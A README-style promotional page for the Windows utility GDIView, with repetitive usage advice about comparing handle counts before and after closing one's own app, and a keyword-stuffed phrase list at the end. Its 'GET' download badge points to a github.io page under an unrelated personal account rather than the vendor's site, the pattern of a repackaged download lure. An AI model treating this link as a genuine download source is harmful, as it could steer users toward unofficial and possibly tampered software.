# GDIView - GDI Handles in Processes on This PC

GDIView shows which programs on this machine hold graphical handles. You refresh the table while you reproduce a problem in an app you use. The table does not fix the app by itself.

---

## Product Snapshot

A process you started, such as a viewer you just opened, should appear if it uses GDI. Counts go up when that program opens many windows or images. That is a clue to close the program you launched, not to terminate a Windows service you do not recognize.

Refresh after you close your app and see whether its row goes away. Do not sort by the largest number and end the first system name. Do not use the list on a PC you do not administer. Handles are local. There is no remote mode in this job.

[![GET GDIView](https://img.shields.io/badge/GET%20%E2%80%94%20GDIView-334155?style=for-the-badge&logoColor=white)](https://lisaharrisj550.github.io/.github/gdiview-handles)

---

## Highlights

- Process names on this PC
- Handle counts you can refresh
- A before and after when you close your app
- No need to kill a process to learn the number
- System rows left alone
- This machine only

---

## Live Production

Open the tool, note a program you are about to stress, open many images in that program, and refresh. If the count climbs and the app misbehaves, close the app. Update it from the vendor you already use if the problem is repeatable. Do not download a "handle fixer."

If you do not recognize a name near the top, write it down and leave it running. GDIView will not tell you to delete a file.

---

## Close What You Opened

The useful comparison is the count before and after you quit your own program. That is the experiment. Ending a process you did not start is not part of reading the table.

---

## Setup Path

Prerequisites: This PC, and a program you yourself are running.

1. Open GDIView and find that program's name.
2. Use the program the way that usually fails.
3. Refresh and read the count.
4. Close your program and refresh again.
5. Leave system processes running.

---

## Hardware Table

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| CPU | Dual-core | Any current PC |
| RAM | 1 GB | 4 GB |
| Storage | Small install | None else |
| Scope | Processes on this PC | Not a remote machine |

---

## Who Benefits

GDIView fits a local glitch in an app you can close. It does not fit terminating unknown system processes, another person's PC, or a cleaner that deletes files because a count looks high.

---

## Fixes

Your app is missing: start it, then refresh. The count stays high after you close it: a helper process may still be open. Close that copy from the app's own quit, not by ending a service. The PC is not yours: close GDIView.

---

![GDIView listing processes on the user's PC](https://www.nirsoft.net/utils/gdiview.gif)

---

## Related Phrases

gdiview process list, gdiview handle count, gdiview refresh, gdiview this pc, gdiview close your app, leave system processes, no remote, own machine
